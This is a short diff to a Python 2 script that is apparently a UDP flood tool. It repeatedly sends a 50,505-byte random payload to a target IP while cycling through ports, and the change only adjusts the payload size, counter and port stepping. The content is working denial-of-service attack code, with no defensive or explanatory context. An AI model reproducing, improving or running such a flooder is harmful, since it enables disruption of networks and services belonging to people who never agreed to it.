@@ -14,7 +14,7 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(50000)
+bytes = random._urandom(50505)
 #############
 
 os.system("clear")
@@ -43,8 +43,8 @@ time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent + 8
-     port = port + 10
+     sent = sent + 5
+     port = port + 5
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
-       port = 1
+       port = 5
